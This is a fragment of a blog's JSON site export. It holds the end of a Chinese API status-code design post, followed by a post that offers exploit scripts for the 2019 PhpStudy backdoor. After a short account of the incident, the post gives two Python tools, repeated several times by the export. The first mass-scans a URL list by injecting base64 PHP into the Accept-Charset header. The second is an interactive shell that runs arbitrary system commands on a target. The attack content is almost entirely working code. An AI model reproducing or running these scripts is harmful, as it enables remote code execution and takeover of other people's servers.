application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">X-RateLimit-Limit</span>: 10</span><br><span class=\"line\"><span class=\"attribute\">X-RateLimit-Remaining</span>: 0</span><br><span class=\"line\"><span class=\"attribute\">X-RateLimit-Reset</span>: 1529839462</span><br><span class=\"line\"><span class=\"attribute\">Retry-After</span>: 290</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 11:19:32 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"message\":\"You have exceeded your rate limit.\",\"error_code\":42900&#125;</span><br></pre></td></tr></table></figure>\n<p>必须 为所有的 API 设置 Rate Limit 支持。</p>\n<h3 id=\"500-Internal-Server-Error\"><a href=\"#500-Internal-Server-Error\" class=\"headerlink\" title=\"500 Internal Server Error\"></a>500 Internal Server Error</h3><p>该状态码 必须 在服务器出错时抛出，对于所有的 500 错误，都 应该 提供完整的错误信息支持，也方便跟踪调试。</p>\n<h3 id=\"503-Service-Unavailable\"><a href=\"#503-Service-Unavailable\" class=\"headerlink\" title=\"503 Service Unavailable\"></a>503 Service Unavailable</h3><p>该状态码表示服务器暂时处理不可用状态，当服务器需要维护或第三方 API 请求超时/不可达时，都 应该 返回该状态码，其中若是主动关闭 API 服务，应该在返回的响应首部加上 Retry-After 头部，表示多少秒后可以再次访问。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">503</span> Service Unavailable</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 10:56:20 GMT</span><br><span class=\"line\"><span class=\"attribute\">Retry-After</span>: 60</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":50300,\"message\":\"服务维护中\"&#125;</span><br></pre></td></tr></table></figure>\n<p>其他 HTTP 状态码请参考 <a href=\"https://link.juejin.im/?target=https%3A%2F%2Fzh.wikipedia.org%2Fzh-hans%2FHTTP%25E7%258A%25B6%25E6%2580%2581%25E7%25A0%2581\" target=\"_blank\" rel=\"noopener\">HTTP 状态码- 维基百科</a>。</p>"},{"layout":"post","title":"PHPStudy后门rec批量利用脚本","abbrlink":12551,"_content":"### 前言\n\n北京时间9月20日，杭州公安发布《杭州警方通报打击涉网违法犯罪暨‘净网2019’专项行动战果》一文，文章曝光了国内知名PHP调试环境程序集成包“PhpStudy软件”遭到黑客篡改并植入“后门”。截至案发，近百万PHP用户中超过67万用户已被黑客控制，并大肆盗取账号密码、聊天记录、设备码类等敏感数据多达10万多组，非法牟利600多万元。\n\n<!--more-->\n\n### 批量检测\n\n```python\n\nimport base64\n\nimport requests\n\nimport threading\n\nimport threadpool\n\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nfiles=input('files:\\n')\n\ndef write_shell(url):\n\n    payload = \"echo md5(123);\"\n\n    payload = base64.b64encode(payload.encode('utf-8'))\n\n    headers = {\n\n    'Upgrade-Insecure-Requests': '1',\n\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',\n\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\n\n    'Accept-Language': 'zh-CN,zh;q=0.9',\n\n    'accept-charset': payload,\n\n    'Accept-Encoding': 'gzip,deflate',\n\n    'Connection': 'close',\n\n}\n\n    try:\n\n        r = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=10)\n\n        if \"202cb962ac59075b964b07152d234b70\" in r.text:\n\n            print ('[ + ] BackDoor successful: '+url+'===============[ + ]\\n')\n\n            with open(files+'.success.txt','a') as f:\n\n                    f.write(url+'\\n')\n\n        else:\n\n            print ('[ - ] BackDoor failed: '+url+'[ - ]\\n')\n\n    except:\n\n        print ('[ - ] Timeout: '+url+' [ - ]\\n')\n\n\n\ndef main():\n\n    with open(files,'r') as f:\n\n        lines = f.read().splitlines()\n\n        task_pool=threadpool.ThreadPool(10)\n\n        requests=threadpool.makeRequests(write_shell,lines)\n\n    for req in requests:\n\n        task_pool.putRequest(req)\n\n        task_pool.wait()\n\nif __name__ == '__main__':\n\n    main()\n```\n\n### 交互Shell\n\n```python\n\nimport base64\nimport requests\nimport threading\nimport threadpool\nimport re\n\nprint(\"======Phpstudy Backdoor Exploit---os-shell============\\n\")\nprint(\"===========By  Qing=================\\n\")\nprint(\"=====Blog：https://www.cnblogs.com/-qing-/==\\n\")\n\ndef os_shell(url,headers,payload):\n    try:\n        r = requests.get(url=url+'/phpinfo.php',headers=headers,verify=False,timeout=10)\n        # print(r.text)\n        res = re.findall(\"qing(.*?)qing\",r.text,re.S)\n        print(\"[ + ]===========The Response:==========[ + ]\\n\")\n        res = \"\".join(res)\n        print(res)\n    except:\n        print(\"[ - ]===========Failed! Timeout...==========[ - ]\\n\")\n\ndef main():\n    url = input(\"input the Url , example:\\\"http://127.0.0.1/\\\"\\n\")\n    payload = input(\"input the payload , default:echo system(\\\"whoami\\\");\\n\")\n    de_payload = \"echo \\\"qing\\\";system(\\\"whoami\\\");echo \\\"qing\\\";\"\n    if payload.strip() == '':\n        payload = de_payload\n    payload = \"echo \\\"qing\\\";\"+payload+\"echo \\\"qing\\\";\"\n    payload = base64.b64encode(payload.encode('utf-8'))\n    payload = str(payload, 'utf-8')\n    headers = {\n    'Upgrade-Insecure-Requests': '1',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\n    'Accept-Language': 'zh-CN,zh;q=0.9',\n    'accept-charset': payload,\n    'Accept-Encoding': 'gzip,deflate',\n    'Connection': 'close',\n    }\n    os_shell(url=url,headers=headers,payload=payload)\nif __name__ == '__main__':\n    main()\n\n```","source":"_posts/2019/9/PHPStudy后门利用脚本.md","raw":"---\nlayout: post\ntitle: PHPStudy后门rec批量利用脚本\ntags:\n  - PHPStudy\ncategories:\n  - hacker\nabbrlink: 12551\n---\n### 前言\n\n北京时间9月20日，杭州公安发布《杭州警方通报打击涉网违法犯罪暨‘净网2019’专项行动战果》一文，文章曝光了国内知名PHP调试环境程序集成包“PhpStudy软件”遭到黑客篡改并植入“后门”。截至案发，近百万PHP用户中超过67万用户已被黑客控制，并大肆盗取账号密码、聊天记录、设备码类等敏感数据多达10万多组，非法牟利600多万元。\n\n<!--more-->\n\n### 批量检测\n\n```python\n\nimport base64\n\nimport requests\n\nimport threading\n\nimport threadpool\n\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nfiles=input('files:\\n')\n\ndef write_shell(url):\n\n    payload = \"echo md5(123);\"\n\n    payload = base64.b64encode(payload.encode('utf-8'))\n\n    headers = {\n\n    'Upgrade-Insecure-Requests': '1',\n\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',\n\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\n\n    'Accept-Language': 'zh-CN,zh;q=0.9',\n\n    'accept-charset': payload,\n\n    'Accept-Encoding': 'gzip,deflate',\n\n    'Connection': 'close',\n\n}\n\n    try:\n\n        r = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=10)\n\n        if \"202cb962ac59075b964b07152d234b70\" in r.text:\n\n            print ('[ + ] BackDoor successful: '+url+'===============[ + ]\\n')\n\n            with open(files+'.success.txt','a') as f:\n\n                    f.write(url+'\\n')\n\n        else:\n\n            print ('[ - ] BackDoor failed: '+url+'[ - ]\\n')\n\n    except:\n\n        print ('[ - ] Timeout: '+url+' [ - ]\\n')\n\n\n\ndef main():\n\n    with open(files,'r') as f:\n\n        lines = f.read().splitlines()\n\n        task_pool=threadpool.ThreadPool(10)\n\n        requests=threadpool.makeRequests(write_shell,lines)\n\n    for req in requests:\n\n        task_pool.putRequest(req)\n\n        task_pool.wait()\n\nif __name__ == '__main__':\n\n    main()\n```\n\n### 交互Shell\n\n```python\n\nimport base64\nimport requests\nimport threading\nimport threadpool\nimport re\n\nprint(\"======Phpstudy Backdoor Exploit---os-shell============\\n\")\nprint(\"===========By  Qing=================\\n\")\nprint(\"=====Blog：https://www.cnblogs.com/-qing-/==\\n\")\n\ndef os_shell(url,headers,payload):\n    try:\n        r = requests.get(url=url+'/phpinfo.php',headers=headers,verify=False,timeout=10)\n        # print(r.text)\n        res = re.findall(\"qing(.*?)qing\",r.text,re.S)\n        print(\"[ + ]===========The Response:==========[ + ]\\n\")\n        res = \"\".join(res)\n        print(res)\n    except:\n        print(\"[ - ]===========Failed! Timeout...==========[ - ]\\n\")\n\ndef main():\n    url = input(\"input the Url , example:\\\"http://127.0.0.1/\\\"\\n\")\n    payload = input(\"input the payload , default:echo system(\\\"whoami\\\");\\n\")\n    de_payload = \"echo \\\"qing\\\";system(\\\"whoami\\\");echo \\\"qing\\\";\"\n    if payload.strip() == '':\n        payload = de_payload\n    payload = \"echo \\\"qing\\\";\"+payload+\"echo \\\"qing\\\";\"\n    payload = base64.b64encode(payload.encode('utf-8'))\n    payload = str(payload, 'utf-8')\n    headers = {\n    'Upgrade-Insecure-Requests': '1',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\n    'Accept-Language': 'zh-CN,zh;q=0.9',\n    'accept-charset': payload,\n    'Accept-Encoding': 'gzip,deflate',\n    'Connection': 'close',\n    }\n    os_shell(url=url,headers=headers,payload=payload)\nif __name__ == '__main__':\n    main()\n\n```","slug":"2019/9/PHPStudy后门利用脚本","published":1,"date":"2019-09-25T07:55:41.248Z","updated":"2020-04-12T06:34:43.627Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzx001v44vq9tsv1ghg","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>北京时间9月20日，杭州公安发布《杭州警方通报打击涉网违法犯罪暨‘净网2019’专项行动战果》一文，文章曝光了国内知名PHP调试环境程序集成包“PhpStudy软件”遭到黑客篡改并植入“后门”。截至案发，近百万PHP用户中超过67万用户已被黑客控制，并大肆盗取账号密码、聊天记录、设备码类等敏感数据多达10万多组，非法牟利600多万元。</p>\n<a id=\"more\"></a>\n<h3 id=\"批量检测\"><a href=\"#批量检测\" class=\"headerlink\" title=\"批量检测\"></a>批量检测</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> threadpool</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> requests.packages.urllib3.exceptions <span class=\"keyword\">import</span> InsecureRequestWarning</span><br><span class=\"line\"></span><br><span class=\"line\">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class=\"line\"></span><br><span class=\"line\">files=input(<span class=\"string\">'files:\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write_shell</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload = <span class=\"string\">\"echo md5(123);\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload = base64.b64encode(payload.encode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'Upgrade-Insecure-Requests'</span>: <span class=\"string\">'1'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'Accept'</span>: <span class=\"string\">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'Accept-Language'</span>: <span class=\"string\">'zh-CN,zh;q=0.9'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'accept-charset'</span>: payload,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'Accept-Encoding'</span>: <span class=\"string\">'gzip,deflate'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'Connection'</span>: <span class=\"string\">'close'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        r = requests.get(url=url+<span class=\"string\">'/index.php'</span>, headers=headers, verify=<span class=\"literal\">False</span>,timeout=<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"202cb962ac59075b964b07152d234b70\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">print</span> (<span class=\"string\">'[ + ] BackDoor successful: '</span>+url+<span class=\"string\">'===============[ + ]\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">with</span> open(files+<span class=\"string\">'.success.txt'</span>,<span class=\"string\">'a'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\"></span><br><span class=\"line\">                    f.write(url+<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">print</span> (<span class=\"string\">'[ - ] BackDoor failed: '</span>+url+<span class=\"string\">'[ - ]\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">print</span> (<span class=\"string\">'[ - ] Timeout: '</span>+url+<span class=\"string\">' [ - ]\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(files,<span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\"></span><br><span class=\"line\">        lines = f.read().splitlines()</span><br><span class=\"line\"></span><br><span class=\"line\">        task_pool=threadpool.ThreadPool(<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        requests=threadpool.makeRequests(write_shell,lines)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> req <span class=\"keyword\">in</span> requests:</span><br><span class=\"line\"></span><br><span class=\"line\">        task_pool.putRequest(req)</span><br><span class=\"line\"></span><br><span class=\"line\">        task_pool.wait()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<h3 id=\"交互Shell\"><a href=\"#交互Shell\" class=\"headerlink\" title=\"交互Shell\"></a>交互Shell</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> threadpool</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">\"======Phpstudy Backdoor Exploit---os-shell============\\n\"</span>)</span><br><span class=\"line\">print(<span class=\"string\">\"===========By  Qing=================\\n\"</span>)</span><br><span class=\"line\">print(<span class=\"string\">\"=====Blog：https://www.cnblogs.com/-qing-/==\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">os_shell</span><span class=\"params\">(url,headers,payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        r = requests.get(url=url+<span class=\"string\">'/phpinfo.php'</span>,headers=headers,verify=<span class=\"literal\">False</span>,timeout=<span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print(r.text)</span></span><br><span class=\"line\">        res = re.findall(<span class=\"string\">\"qing(.*?)qing\"</span>,r.text,re.S)</span><br><span class=\"line\">        print(<span class=\"string\">\"[ + ]===========The Response:==========[ + ]\\n\"</span>)</span><br><span class=\"line\">        res = <span class=\"string\">\"\"</span>.join(res)</span><br><span class=\"line\">        print(res)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"[ - ]===========Failed! Timeout...==========[ - ]\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    url = input(<span class=\"string\">\"input the Url , example:\\\"http://127.0.0.1/\\\"\\n\"</span>)</span><br><span class=\"line\">    payload = input(<span class=\"string\">\"input the payload , default:echo system(\\\"whoami\\\");\\n\"</span>)</span><br><span class=\"line\">    de_payload = <span class=\"string\">\"echo \\\"qing\\\";system(\\\"whoami\\\");echo \\\"qing\\\";\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload.strip() == <span class=\"string\">''</span>:</span><br><span class=\"line\">        payload = de_payload</span><br><span class=\"line\">    payload = <span class=\"string\">\"echo \\\"qing\\\";\"</span>+payload+<span class=\"string\">\"echo \\\"qing\\\";\"</span></span><br><span class=\"line\">    payload = base64.b64encode(payload.encode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    payload = str(payload, <span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'Upgrade-Insecure-Requests'</span>: <span class=\"string\">'1'</span>,</span><br><span class=\"line\">    <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'</span>,</span><br><span class=\"line\">    <span class=\"string\">'Accept'</span>: <span class=\"string\">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class=\"line\">    <span class=\"string\">'Accept-Language'</span>: <span class=\"string\">'zh-CN,zh;q=0.9'</span>,</span><br><span class=\"line\">    <span class=\"string\">'accept-charset'</span>: payload,</span><br><span class=\"line\">    <span class=\"string\">'Accept-Encoding'</span>: <span class=\"string\">'gzip,deflate'</span>,</span><br><span class=\"line\">    <span class=\"string\">'Connection'</span>: <span class=\"string\">'close'</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    os_shell(url=url,headers=headers,payload=payload)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>北京时间9月20日，杭州公安发布《杭州警方通报打击涉网违法犯罪暨‘净网2019’专项行动战果》一文，文章曝光了国内知名PHP调试环境程序集成包“PhpStudy软件”遭到黑客篡改并植入“后门”。截至案发，近百万PHP用户中超过67万用户已被黑客控制，并大肆盗取账号密码、聊天记录、设备码类等敏感数据多达10万多组，非法牟利600多万元。</p>","more":"<h3 id=\"批量检测\"><a href=\"#批量检测\" class=\"headerlink\" title=\"批量检测\"></a>批量检测</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> threadpool</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> requests.packages.urllib3.exceptions <span class=\"keyword\">import</span> InsecureRequestWarning</span><br><span class=\"line\"></span><br><span class=\"line\">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class=\"line\"></span><br><span class=\"line\">files=input(<span class=\"string\">'files:\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write_shell</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload = <span class=\"string\">\"echo md5(123);\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload = base64.b64encode(payload.encode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'Upgrade-Insecure-Requests'</span>: <span class=\"string\">'1'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'Accept'</span>: <span class=\"string\">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'Accept-Language'</span>: <span class=\"string\">'zh-CN,zh;q=0.9'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'accept-charset'</span>: payload,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'Accept-Encoding'</span>: <span 